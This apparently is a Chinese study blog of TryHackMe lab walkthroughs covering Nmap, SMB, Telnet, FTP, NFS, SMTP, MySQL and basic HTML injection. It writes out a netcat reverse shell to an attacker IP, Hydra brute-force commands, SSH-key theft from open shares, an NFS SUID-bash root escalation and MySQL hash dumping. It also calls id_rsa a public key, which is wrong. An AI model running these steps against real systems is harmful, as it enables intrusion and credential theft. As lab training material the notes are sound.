<h6 id="与NSE合作"><a href="#与NSE合作" class="headerlink" title="与NSE合作"></a>与NSE合作</h6><p>要运行特定脚本，我们将使用<code>--script=&lt;script-name&gt;</code> ，例如<code>--script=http-fileupload-exploiter</code>。<br>可以通过逗号分隔多个脚本，以此方式同时运行多个脚本。例如：<code>--script=smb-enum-users,smb-enum-shares</code>。<br>某些脚本需要参数（例如，如果它们正在利用经过身份验证的漏洞，则需要凭据）。可以使用<code>--script-args</code> Nmap开关提供这些参数。<code>http-put</code>例如，脚本（用于使用 PUT 方法上传文件）。这需要两个参数：要将文件上传到的 URL 和文件在磁盘上的位置。例如：<br><code>nmap -p 80 --script http-put --script-args http-put.url=&#39;/dav/shell.php&#39;,http-put.file=&#39;./shell.php&#39;</code><br>Nmap脚本带有内置帮助菜单，可以使用 访问<code>nmap --script-help &lt;script-name&gt;</code></p>
<h6 id="搜索脚本"><a href="#搜索脚本" class="headerlink" title="搜索脚本"></a>搜索脚本</h6><p>Nmap 将其脚本存储在Linux上的 。默认情况下，所有 NSE 脚本都存储在此目录中 - 这是Nmap在您指定脚本时查找脚本的<code>/usr/share/nmap/scripts</code>位置。<br>使用文件<code>/usr/share/nmap/scripts/script.db</code>。尽管有扩展名，但这实际上不是一个数据库，而是一个格式化的文本文件，其中包含每个可用脚本的文件名和类别。Nmap使用此文件来跟踪（和利用）脚本引擎的脚本；但是，我们也可以通过_grep_来查找脚本。例如：<code>grep &quot;ftp&quot; /usr/share/nmap/scripts/script.db</code>。<br>使用命令<code>ls</code>。例如，我们可以通过使用以下命令获得相同的结果<code>ls -l /usr/share/nmap/scripts/*ftp*</code><br>相同的技术也可用于搜索脚本类别。例如：<br><code>grep &quot;safe&quot; /usr/share/nmap/scripts/script.db</code></p>
<p>防火墙逃避<br>典型的 Windows 主机会使用其默认防火墙阻止所有 ICMP 数据包。<br>-Pn    描主机之前不要 ping 主机，Nmap将始终将目标主机视为活动主机，从而有效地绕过 ICMP 阻止。<br>-f    - 用于对数据包进行分段（即将其分割成更小的块），从而降低防火墙或IDS检测到数据包的可能性。的替代方案<code>-f</code>，但可以更好地控制数据包的大小：<code>--mtu &lt;number&gt;</code>，接受用于发送数据包的最大传输单元大小。这_必须_是 8 的倍数。<br>–scan-delay ‘time’ms    - 用于在发送的数据包之间添加延迟。这在网络不稳定时非常有用，但也可以用于规避可能存在的任何基于时间的防火墙&#x2F; IDS触发器。<br>–badsum     这用于生成无效的数据包校验和。任何真正的 TCP&#x2F;IP 堆栈都会丢弃此数据包，但是，防火墙可能会自动响应，而无需检查数据包的校验和。因此，此开关可用于确定防火墙&#x2F; IDS的存在。<br>–data-length    允许将任意长度的随机数据附加到数据包末尾</p>
<p>目标 IP 是否响应 ICMP 回显（ping）请求<br>nmap -PE Machine_IP<br>对目标的前 999 个端口执行 Xmas 扫描——有多少端口显示为打开或被过滤<br>nmap -p 1-999 -sX Machine_IP -Pn -vv<br>对目标的前 5000 个端口执行 TCP SYN 扫描——显示有多少端口是开放的<br>nmap -sS Machine_IP -p 1-5000 -vv<br>对目标上的端口 80 执行 TCP 连接扫描，监控结果。确保您了解正在发生的事情。 针对该框部署脚本。Nmap 能否成功登录端口 21 上的 FTP 服务器 <code>ftp-anon</code><br>nmap –script&#x3D;ftp-anon -p Machine_IP -vv</p>
<h4 id="网络服务"><a href="#网络服务" class="headerlink" title="网络服务"></a>网络服务</h4><h5 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h5><p>了解SMB（Server Message Block）<br>客户端-服务器通信协议，用于共享对网络上的文件、打印机、串行端口和其他资源的访问<br>SMB 协议被称为响应-请求协议，这意味着它在客户端和服务器之间传输多条消息以建立连接。客户端使用TCP &#x2F;IP（实际上是 RFC1001 和 RFC1002 中指定的TCP &#x2F;IP 上的 NetBIOS）、NetBEUI 或 IPX&#x2F;SPX 连接到服务器。<br>Samba 是一款支持SMB协议的开源服务器，专为 Unix 系统发布。</p>
<p>枚举SMB<br>枚举是收集目标信息以便找到潜在攻击媒介并协助利用的过程，可用于收集用户名、密码、网络信息、主机名、应用程序数据、服务或任何其他可能对攻击者有价值的信息。<br>Enum4Linux是一种用于枚举 Windows 和 Linux 系统上的 SMB 共享的工具。它基本上是 Samba 包中工具的包装器，可轻松快速地从目标中提取与 SMB 相关的信息。<a target="_blank" rel="noopener" href="https://github.com/CiscoCXSecurity/enum4linux">https://github.com/CiscoCXSecurity/enum4linux</a><br>Enum4Linux 的语法非常简单：“enum4linux ‘options’ ip”<br>-U 获取用户列表<br>-M 获取机器列表<br>-N 获取名称列表转储（不同于 -U 和 -M）<br>-S 获取共享列表<br>-P 获取密码策略信息<br>-G 获取组和成员列表<br>-a 以上所有（完整基本枚举）<br>哪些份额突出且值得调查    <code>IPC$</code>和<code>print$</code>是默认的 SMB 共享。<code>netlogon</code>是属于网络登录服务的共享。通过排除法，突出的共享是<code>profiles</code>。<br>SMB在端口上运行     139&#x2F;445</p>
<p>利用SMB<br>存在CVE-2017-7494等漏洞利用 SMB 实现远程代码执行（少数）<br>利用匿名SMB共享访问 - 一种常见的配置错误，可以让我们获得可导致 shell 的信息（多数）<br>远程访问SMB共享：<code>smbclient //[IP]/[SHARE]</code><br>-U    名称：指定用户<br>-p    端口：指定端口<br>在默认端口上具有 IP 10.10.10.2 的计算机上以用户“suit”身份访问名为“secret”的 SMB 共享的正确语法        smbclient &#x2F;&#x2F;10.10.10.2&#x2F;secret -U suit -p 445</p>
<p>检测共享是否已配置为允许匿名访问，即不需要身份验证即可查看文件<br>1.使用用户名“Anonymous”<br>2.连接到在枚举阶段发现的共享<br>3.并且不提供密码<br>smbclient &#x2F;&#x2F;10.10.235.120&#x2F;profiles -U Anonymous    进入smb<br>ls查看文件利用more命令读取文件    more “Working From Home Information.txt”<br>SSH 密钥存储在<code>.ssh</code>目录中。默认情况下，服务器的公钥保存在名为的文件中<code>id_rsa</code>，公钥存储在名为的文件中<code>id_rsa.pub</code>。</p>
<ol>
<li>nmap -p- -sV -O 10.10.235.120 -vv -Pn    找到关于smb的端口</li>
<li>enum4linux -a 10.10.235.120    找到共享文件夹名称</li>
<li>smbclient &#x2F;&#x2F;10.10.235.120&#x2F;profiles -U Anonymous    利用匿名登录访问文件夹</li>
<li>more “Working From Home Information.txt”    查看用户名及其配置</li>
<li>发现.ssh 然后cd .ssh 发现文件夹内 id_rsa id_rsa.pub<br>通过mget下载到本地<br>mget id_rsa mget id_rsa.pub</li>
<li>进入本地使用  “chmod 600 id_rsa”将权限更改为“600”<br>然后直接本地ssh cactus@ 10.10.235.120 ,使用服务和密钥登录服务器</li>
</ol>
<h5 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h5><p>了解Telnet<br>Telnet 是一种应用程序协议，它允许您使用 telnet 客户端连接到托管 telnet 服务器的远程计算机并在其上执行命令（Telnet 以明文形式发送所有消息，并且没有特定的安全机制）<br>使用以下语法连接到 telnet 服务器   telnet ‘ip’ ‘port’</p>
<p>枚举Telnet<br>端口扫描，以找出有关目标机器的服务、应用程序、结构和操作系统的尽可能多的信息。使用nmap 扫描机器</p>
<p>利用Telnet<br>什么是反向 Shell？<br> shell 可以简单地描述为一段代码或程序，可用于在设备上获取代码或命令执行。<br>反向 shell 是目标机器与攻击机器进行通信的一种 shell。<br>攻击机器有一个监听端口，它在该端口接收连接，从而实现代码或命令的执行。</p>
<ol>
<li>nmap -p- -sV -sS 10.10.236.9 -vv -Pn   找到关于telnet的端口</li>
<li>telnet 10.10.236.9 8012    尝试连接telnet</li>
<li>sudo tcpdump ip proto \icmp -i ens5  或  sudo tcpdump ip proto \icmp -i tun0  或   sudo tcpdump ip proto \icmp -i eth0    启动本地机器上的tcpdump监听器</li>
<li>在telnet会话中使用 .RUN ping 10.10.99.174 -c 1（ip为本地机器）再次查看tcpdump监听器查看是否收到信息（如果收到意味着可以执行系统命令）</li>
<li>msfvenom -p cmd &#x2F; unix &#x2F; reverse_netcat lhost &#x3D; [本地 tun0 ip ] lport &#x3D; 4444 R<br>-p &#x3D; 有效载荷<br>lhost &#x3D; 我们的本地主机 IP 地址（这是机器的 IP 地址）<br>lport &#x3D; 要监听的端口（这是机器上的端口）<br>R &#x3D; 以原始格式导出有效载荷<br>用 msfvenom 生成反向 shell 有效负载<br>mkfifo &#x2F;tmp&#x2F;ztakzrb; nc 10.10.99.174 4444 0&lt;&#x2F;tmp&#x2F;ztakzrb | &#x2F;bin&#x2F;sh &gt;&#x2F;tmp&#x2F;ztakzrb 2&gt;&1; rm &#x2F;tmp&#x2F;ztakzrb</li>
<li>nc -lcp 4444（监听端口）</li>
<li>在telnet命令中执行.RUN mkfifo &#x2F;tmp&#x2F;ztakzrb; nc 10.10.99.174 4444 0&lt;&#x2F;tmp&#x2F;ztakzrb | &#x2F;bin&#x2F;sh &gt;&#x2F;tmp&#x2F;ztakzrb 2&gt;&1; rm &#x2F;tmp&#x2F;ztakzrb</li>
<li>打开nc -lvp 4444，即可进行命令执行</li>
</ol>
<h5 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h5><p>了解FTP<br>种用于允许通过网络远程传输文件的协议，非常高效的方式传递命令和数据。<br>典型的FTP会话使用两个通道运行：</p>
<ul>
<li>命令（有时称为控制）通道</li>
<li>数据通道<br>命令通道用于传输命令以及对这些命令的回复，而数据通道用于传输数据<br>客户端发起与服务器的连接，服务器验证提供的所有登录凭据，然后打开会话，会话打开时，客户端可以在服务器上执行FTP命令。<br>FTP服务器可能支持主动连接或被动连接，或者两者兼而有之</li>
<li>在主动FTP连接中，客户端打开一个端口并监听。服务器需要主动连接该端口。 </li>
<li>在被动FTP 连接中，服务器打开一个端口并（被动）监听，然后客户端连接到该端口。<br>标准FTP端口    21</li>
</ul>
<p>枚举FTP<br>利用匿名FTP登录，查看我们可以访问哪些文件，以及这些文件是否包含任何可能允许我们在系统上弹出 shell 的信息。</p>
<p>利用FTP<br>使用 FTP时，命令和数据通道均未加密<br>Hydra<br>对 50 多种协议执行快速字典攻击，包括 Telnet、RDP、SSH、FTP、HTTP、HTTPS、SMB、多个数据库等等<br>查找密码的命令的语法    hydra -t 4 -l dale -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -vV 10.10.10.6 ftp<br>-t 4 每个目标的并行连接数  线程数<br>-l     用户    指向您试图泄露其账户的用户<br>-P     字典路径    指向包含可能密码列表的文件<br>-vV     将详细模式设置为非常详细，显示每次尝试的登录名+密码组合<br>-f    找到第一个匹配项时停止<br>  机器 IP    目标机器的 IP 地址<br>  ftp &#x2F; 协议 设置协议<br><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
<ol>
<li>nmap -p- -sS -sV -T4 10.10.153.246 -vv -Pn    扫描端口</li>
<li>ftp 10.10.153.246    ftp匿名登陆 anonymous</li>
<li>more “PUBLIC_NOTICE.txt”    查找用户名</li>
<li>hydra -t 4 -l mike -f -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -vV 10.10.153.246 ftp    进行协议密码爆破</li>
<li>ftp 10.10.153.246 登录 username：mike    password：password</li>
<li>登录成功</li>
</ol>
<h4 id="网络服务2"><a href="#网络服务2" class="headerlink" title="网络服务2"></a>网络服务2</h4><h5 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h5><p>了解NFS<br>代表“网络文件系统”，允许系统通过网络与其他系统共享目录和文件。通过使用 NFS，用户和程序可以像访问本地文件一样访问远程系统上的文件。<br>NFS如何工作？<br>首先，客户端将请求将远程主机上的目录挂载到本地目录上，就像挂载物理设备一样。然后，挂载服务将使用 RPC 连接到相关的挂载守护程序。服务器检查用户是否有权挂载所请求的目录。然后它将返回一个文件句柄，该句柄唯一地标识服务器上的每个文件和目录。<br>向服务器上的 NFSD（NFS 守护程序）发出 RPC 调用，调用采用以下参数：</p>
<ul>
<li>文件句柄</li>
<li>要访问的文件的名称</li>
<li>用户的用户 ID</li>
<li>用户的组 ID</li>
</ul>
<p>枚举NFS<br>为了对NFS服务器和共享进行更高级的枚举，从本地 计算机与任何 NFS 共享进行交互的关键：nfs-common。<br>NFS-Common：包括以下程序：  lockd、statd、showmount、nfsstat、  gssd、  dmapd和mount.nfs。<br>挂载 NFS 共享<br>户端系统需要一个目录，其中可以访问主机服务器在导出文件夹中共享的所有内容，创建此挂载点后，您可以使用“mount”命令将 NFS 共享连接到计算机上的挂载点    sudo mount -t nfs IP:share &#x2F;tmp&#x2F;mount&#x2F; -nolock<br>sudo    以 root 身份运行<br>mount    执行挂载命令<br>-t nfs    要挂载的设备类型，然后指定它是 NFS<br>IP:share    NFS 服务器的 IP 地址以及我们希望挂载的共享的名称<br>-nolock    指定不使用 NLM 锁定</p>
<p>利用NFS<br>root_squash：默认情况下，在 NFS 共享上，Root Squashing 是启用的，并阻止任何连接到 NFS 共享的人拥有 NFS 卷的 root 访问权限。远程 root 用户在连接时会被分配一个用户“nfsnobody”，该用户拥有最低的本地权限。如果关闭此功能，它可以允许创建 SUID 位文件，从而允许远程用户拥有对所连接系统的 root 访问权限。<br>SUID：可以使用文件所有者&#x2F;组的权限运行文件。<br>方法：将文件上传到 NFS 共享，并控制这些文件的权限。<br>可执行文件：使用 SCP 命令 scp -i key_name <a href="mailto:&#117;&#115;&#101;&#114;&#110;&#97;&#x6d;&#101;&#x40;&#x31;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x32;&#52;&#57;&#46;&#x32;&#52;">&#117;&#115;&#101;&#114;&#110;&#97;&#x6d;&#101;&#x40;&#x31;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x32;&#52;&#57;&#46;&#x32;&#52;</a>:&#x2F;bin&#x2F;bash ~&#x2F;Downloads&#x2F;bash  将其下载到我们的攻击机器上。</p>
<p>NFS 访问     sudo nmap -sS -T4 -A -p- 10.10.128.130<br>使用“&#x2F;usr&#x2F;sbin&#x2F;showmount -e ‘IP’ 列出 NFS 共享    &#x2F;usr&#x2F;sbin&#x2F;showmount -e 10.10.128.130<br>使用“mkdir &#x2F;tmp&#x2F;mount”在您的机器上创建一个目录以挂载共享。该目录位于“&#x2F;tmp”目录中（将在重新启动时被删除），mount 命令将 NFS 共享挂载到您的本地机器。    mkdir &#x2F;tmp&#x2F;home &amp;&amp; sudo mount -t nfs 10.10.128.130:home &#x2F;tmp&#x2F;home -nolock<br>查看.ssh，更改权限    sudo chmod 600 id_rsa<br>连接root用户    ssh <a href="mailto:&#99;&#97;&#x70;&#x70;&#117;&#x63;&#x69;&#x6e;&#x6f;&#64;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x31;&#x32;&#x2e;&#x32;&#52;&#56;">&#99;&#97;&#x70;&#x70;&#117;&#x63;&#x69;&#x6e;&#x6f;&#64;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x31;&#x32;&#x2e;&#x32;&#52;&#56;</a> -i id_rsa</p>
<p>首先，将目录更改为机器上的挂载点，NFS 共享仍应挂载在该挂载点，然后进入用户的主目录。<br>导航到系统上包含与此房间相关的文件的目录。然后使用 SCP<code>bash</code>从目标系统下载二进制文件。<br>scp -i &#x2F;tmp&#x2F;home&#x2F;cappacino&#x2F;.ssh&#x2F;id_rsa <a href="mailto:&#x63;&#x61;&#x70;&#x70;&#x75;&#99;&#x69;&#110;&#x6f;&#x40;&#49;&#x30;&#x2e;&#49;&#48;&#46;&#x31;&#x32;&#x38;&#46;&#49;&#51;&#48;">&#x63;&#x61;&#x70;&#x70;&#x75;&#99;&#x69;&#110;&#x6f;&#x40;&#49;&#x30;&#x2e;&#49;&#48;&#46;&#x31;&#x32;&#x38;&#46;&#49;&#51;&#48;</a>:&#x2F;bin&#x2F;bash .<br>将 bash 可执行文件下载到您的下载目录。然后使用“cp ~&#x2F;Downloads&#x2F;bash .”将 bash 可执行文件复制到 NFS 共享。复制的 bash shell 必须由 root 用户拥有，您可以使用“sudo chown root bash”进行设置<br>将下载的二进制文件复制<code>bash</code>到用户的主目录中<code>cappucino</code>。使用将<code>chown</code>所有者更改为<code>root</code>。<br>cp ~&#x2F;Security&#x2F;tryhackme&#x2F;network_services_2&#x2F;bash .      sudo chown root:root bash<br>使用“sudo chmod +’permission’ bash”将 SUID 位权限添加到刚刚复制到共享的 bash 可执行文件中    sudo chmod +s bash     SUID 是可以分配给文件的一种特殊权限。设置了此标志的文件将以所有者的权限而不是当前用户的权限执行。<br>进行完整性检查，使用“ls -la bash”检查“bash”可执行文件的权限，确保它以 -sr-x 结尾。-rwsr-sr-x</p>
<p>以用户身份通过 SSH 进入计算机。列出目录以确保 bash 可执行文件存在。使用“.&#x2F;bash -p”运行它。-p 保留权限，以便它可以以 root 身份运行并具有 SUID-，否则 bash 有时会放弃权限。    .&#x2F;bash -p</p>
<h5 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h5><p>了解SMTP<br>SMTP 代表“简单邮件传输协议”。它用于处理电子邮件的发送。为了支持电子邮件服务，需要一对协议，包括SMTP和 POP&#x2F; IMAP,分别允许用户发送外发邮件和检索收到的邮件。<br>SMTP服务器执行三项基本功能:</p>
<ol>
<li>验证谁通过SMTP服务器发送电子邮件</li>
<li>发送外发邮件</li>
<li>如果无法送达外发邮件，它会将邮件发回给发件人<br> OP 和IMAP ：POP（即“邮局协议”）和 IMAP（即“互联网消息访问协议”）都是电子邮件协议，负责在客户端和邮件服务器之间传输电子邮件。主要区别在于 POP 更简单的方法，即从邮件服务器下载收件箱到客户端。而IMAP将同步当前收件箱和服务器上的新邮件，下载任何新邮件。<br> 从另一台计算机同步收件箱，则通过IMAP在一台计算机上对收件箱所做的更改将保留。POP&#x2F; IMAP服务器负责完成此过程。<br> SMTP工作原理：用户将提供电子邮件（信件）和服务（邮政投递服务），并通过一系列步骤将其投递到收件人的收件箱（邮箱）。SMTP 服务器在此服务中的作用是充当分拣办公室，电子邮件（信件）被拾取并发送到此服务器，然后由该服务器将其发送给收件人。</li>
</ol>
<pre><code>SMTP工作流程     
</code></pre>
<ol>
<li>邮件用户代理，连接到域的SMTP服务器将启动SMTP握手。通过SMTP端口工作 - 通常为 25。会话开始。</li>
<li>现在可以开始发送邮件了。客户端首先将发件人和收件人的电子邮件地址、电子邮件正文和所有附件提交给服务器。</li>
<li>SMTP服务器检查收件人和发件人的域名是否相同。</li>
<li>发件人的 SMTP 服务器将在转发电子邮件之前连接到收件人的 SMTP 服务器。如果收件人的服务器无法访问或不可用，则电子邮件将被放入SMTP队列。</li>
<li>收件人的SMTP服务器将验证收到的电子邮件。服务器将电子邮件转发到 POP 或IMAP服务器，电子邮件将显示在收件人的收件箱中。</li>
</ol>
<p>枚举SMTP<br>枚举服务器详细信息<br>配置不当或存在漏洞的邮件服务器，将使用 MetaSploit 中的‘smtp_version’模块来执行此操作。<br>从SMTP枚举用户<br>有两个允许枚举用户的内部命令：VRFY（确认有效用户的名称）和 EXPN（显示用户别名的实际地址和电子邮件列表（邮件列表）。通过 telnet 连接手动完成此操作 - 然而 Metasploit 再次来帮忙，它提供了一个方便的模块，名为‘smtp_enum ’。</p>
<p>利用SMTP<br>在枚举的最后获取的信息：1. 用户账户名  2. 运行SMTP服务器和操作系统的类型<br>利用这些信息使用Hydra强行破解ssh登陆密码<br>使用查找密码的命令的语法：hydra -t 16 -l 用户名 -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -vV 10.10.227.115 ssh<br>hydra    运行 hydra 工具<br>-t 16    每个目标的并行连接数<br>-l ‘user’    指向你试图入侵其账户的用户<br>-P ‘path to dictionary’    指向包含可能密码列表的文件<br>-vV    将详细模式设置为非常详细，显示每次尝试的登录名+密码组合<br>‘machine IP’    目标机器的 IP 地址<br>ssh &#x2F; protocol    设置协议<br>-f    找到有效凭据时退出</p>
<p>扫描得到ssh和smtp端口    nmap -sV -p- 10.10.227.115<br>进入msf    msfconsole -q    搜索smtp_version    search smto_version    use 0    options    set RHOSTS 10.10.227.115    run<br>搜索smtp_enum    search smtp_enum    use0     options    set RHOSTS 10.10.227.115    run<br>爆破    hydra -t 16 -l administrator -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -f -v 10.10.227.115 ssh<br>[22][ssh] host: 10.10.227.115   login: administrator   password: alejandro<br>ssh <a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#105;&#115;&#116;&#x72;&#97;&#x74;&#x6f;&#x72;&#x40;&#49;&#48;&#x2e;&#49;&#48;&#x2e;&#50;&#50;&#55;&#x2e;&#x31;&#x31;&#x35;">&#97;&#100;&#x6d;&#105;&#x6e;&#105;&#115;&#116;&#x72;&#97;&#x74;&#x6f;&#x72;&#x40;&#49;&#48;&#x2e;&#49;&#48;&#x2e;&#50;&#50;&#55;&#x2e;&#x31;&#x31;&#x35;</a></p>
<h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><p>了解MySQL<br>基于结构化查询语言 (SQL) 的关系数据库管理系统 (RDBMS)，使用客户端-服务器模型，由服务器和有助于管理 MySQL 数据库的实用程序组成。<br>服务器处理所有数据库指令，如创建、编辑和访问数据。它接收和管理这些请求并使用 MySQL 协议进行通信。</p>
<ol>
<li>MySQL创建一个数据库用于存储和操作数据，定义每个表的关系</li>
<li>客户端通过SQL中的特定语句提出请求</li>
<li>服务器将会向客户端响应所请求的任何信息</li>
</ol>
<p>枚举MySQL<br>假设在枚举 Web 服务器的子域时找到了凭据**：“root:password”。在尝试登录SSH失败后，您决定尝试登录 MySQL<br>使用 进行安装    sudo apt install default-mysql-client    只会安装客户端</p>
<p>利用MySQL<br>哈希是一种加密算法的产物，用于将可变长度的输入转换为固定长度的输出。在 MySQL 中，哈希可以以不同的方式使用，例如将数据索引到哈希表中。每个哈希都有一个唯一的 ID，用作指向原始数据的指针。这会创建一个比原始数据小得多的索引，从而可以更有效地搜索和访问值。<br>要提取的数据是密码哈希，它只是一种非纯文本格式的密码存储方式。</p>
<p>MySQL 正在使用端口    nmap -sV -p- 10.10.222.148<br>使用命令“ mysql -h ‘P’ -u ‘用户名’ -p ” 尝试登陆    mysql -h 10.10.222.148 -u root -p    退出quit<br>启动 Metasploit，使用“mysql_sql”模块    msfconsole -q    search mysql_sql<br>exploit    显示系统版本<br>set SQL “show databases”    run    数据库的数量及其名称<br>选择“mysql_schemadump”模块    search mysql_schemadump<br>行漏洞利用。最后转储的表的名称    x$waits_global_by_latency<br>搜索并选择“mysql_hashdump”模块    search mysql_hashdump<br>运行得到用户名和hash    carl:* EA031893AA21444B170FC2162A56978B8CEECE18<br>echo “carl:* EA031893AA21444B170FC2162A56978B8CEECE18” &gt; hash.txt<br>john hash.txt    得到密码doggie    ssh登录</p>
<h3 id="网络黑客基础知识"><a href="#网络黑客基础知识" class="headerlink" title="网络黑客基础知识"></a>网络黑客基础知识</h3><h4 id="网站如何运作"><a href="#网站如何运作" class="headerlink" title="网站如何运作"></a>网站如何运作</h4><h5 id="网站如何运作-1"><a href="#网站如何运作-1" class="headerlink" title="网站如何运作"></a>网站如何运作</h5><p>网站由两个主要部分组成：</p>
<ol>
<li>前端（客户端）——您的浏览器呈现网站的方式。</li>
<li>后端（服务器端）——处理您的请求并返回响应的服务器。<br>网站主要使用以下方式创建：</li>
</ol>
<ul>
<li>HTML，用于建立网站并定义其结构</li>
<li>CSS，通过添加样式选项使网站看起来更漂亮</li>
<li>JavaScript，使用交互功能在页面上实现复杂的功能</li>
</ul>
<h5 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h5><p>超文本标记语言(HTML) 是网站使用的语言。元素（也称为标签）是 HTML 页面的构建块，用于告诉浏览器如何显示内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYRE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Page Title&lt;/title&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Example Heading&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;Example paragraph..&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>跨不同浏览器实现标准化，并告知浏览器使用 HTML5 来解释该页面。<code>&lt;!DOCTYPE html&gt;</code><br>该元素是 HTML 页面的根元素 - 所有其他元素都位于此元素之后。<code>&lt;html&gt;</code><br>元素包含有关页面的信息（例如页面标题）<code>&lt;head&gt;</code><br>元素定义 HTML 文档的主体；只有主体内的内容才会显示在浏览器中。<code>&lt;body&gt;</code><br>元素定义一个大标题<code>&lt;h1&gt;</code><br>元素定义一个段落<code>&lt;p&gt;</code><br>按钮（ ）、图像（）<code>&lt;button&gt;``&lt;img&gt;</code><br>标签可以包含属性，例如可用于设置元素样式的 class 属性（例如，使标签具有不同的颜色），或 在图像上用于指定图像位置的_src属性：一个元素可以具有多个属性，每个属性都有其独特的用途，例如，  <p attribute1="value1" attribute2="value2"> 。<code>&lt;p class=&quot;bold-text&quot;&gt;``&lt;img src=&quot;/2024/09/02/网络安全基础/cat.jpg&quot; &gt;.</code><br>元素还可以具有 id 属性 ( )，该属性对于元素而言是唯一的。与 class 属性不同（多个元素可以使用相同的类），元素必须具有不同的 id 才能 唯一地标识它们。元素 id 用于样式设置和通过 JavaScript 进行标识。<code>&lt;p id=&quot;example&quot;&gt;</code></p>
<h5 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h5><p>JavaScript 被添加在页面源代码中，既可以在标签内加载，也可以通过 src 属性远程包含：<code>&lt;script&gt;``&lt;script src=&quot;/location/of/javascript_file.js&quot;&gt;&lt;/script&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;TryHackMe Editor&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id=&quot;demo&quot;&gt;Hi there!&lt;/div&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">         document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hack the Planet&quot;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>HTML 元素也可以具有事件，例如“onclick”或“onhover”，当事件发生时执行 JavaScript。以下代码将带有 demo ID 的元素的文本更改为 Button Clicked： - onclick 事件也可以在 JavaScript 脚本标签内定义，而不是直接在元素上定义。 <code>&lt;button onclick=&#39;document.getElementById(&quot;demo&quot;).innerHTML = &quot;Button Clicked&quot;;&#39;&gt;Click Me!&lt;/button&gt;</code></p>
<h5 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a>敏感数据泄露</h5><p>当网站未能正确保护（或删除）最终用户的敏感明文信息时，就会发生敏感数据泄露；这些信息通常出现在网站的前端源代码中。</p>
<h5 id="HTML注入"><a href="#HTML注入" class="headerlink" title="HTML注入"></a>HTML注入</h5><p>HTML 注入是一种漏洞，当页面上显示未经过滤的用户输入时就会发生这种情况。 如果网站未能过滤用户输入（过滤用户输入到网站的任何“恶意”文本），并且该输入在页面上使用，则攻击者可以将 HTML 代码注入易受攻击的网站。<br>当用户可以控制其输入的显示方式时，他们可以提交 HTML（或 JavaScript）代码，浏览器将在页面上使用它，从而允许用户控制页面的外观和功能。<br>用户在“你的名字是什么”字段中输入的任何内容都会传递给 JavaScript 函数并输出到页面，这意味着如果用户在字段中添加自己的 HTML 或 JavaScript，它将在 sayHi 函数中使用并添加到页面中 - 这意味着您可以添加自己的 HTML（例如 h1 标签），它会将您的输入输出为纯 HTML。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://hacker.com&quot;&gt;hacker link&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="HTTP详解"><a href="#HTTP详解" class="headerlink" title="HTTP详解"></a>HTTP详解</h4><h5 id="什么是HTTP-S"><a href="#什么是HTTP-S" class="headerlink" title="什么是HTTP(S)"></a>什么是HTTP(S)</h5><p>HTTP是您浏览网站时使用的协议，由 Tim Berners-Lee 及其团队在 1989 年至 1991 年间开发。HTTP是用于与 Web 服务器通信以传输网页数据的一组规则，无论是 HTML、图像、视频等。</p>
<p>HTTPS 是 HTTP 的安全版本。HTTPS 数据经过加密，因此不仅可以阻止他人查看您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是与冒充它的服务器通信。</p>
